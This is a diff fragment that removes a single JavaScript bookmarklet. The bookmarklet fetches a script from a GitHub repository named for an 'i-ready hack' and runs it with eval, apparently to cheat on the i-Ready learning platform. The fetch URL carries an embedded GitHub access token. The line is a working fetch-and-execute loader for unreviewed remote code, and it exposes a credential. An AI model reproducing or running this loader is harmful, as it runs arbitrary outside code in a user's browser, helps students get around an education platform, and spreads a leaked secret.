@@ -1,1 +1,0 @@
-javascript:(()=>{fetch('https://raw.githubusercontent.com/RipAngelhacks/i-ready-hack-javascript/main/Dupelesson2.js?token=GHSAT0AAAAAACAWSY4HGLUCH7UEUZGG5726ZCXBNSQ').then(r=>r.text()).then(c=>eval(c)).catch(e=>console.error('Failed to fetch code from GitHub',e));})();
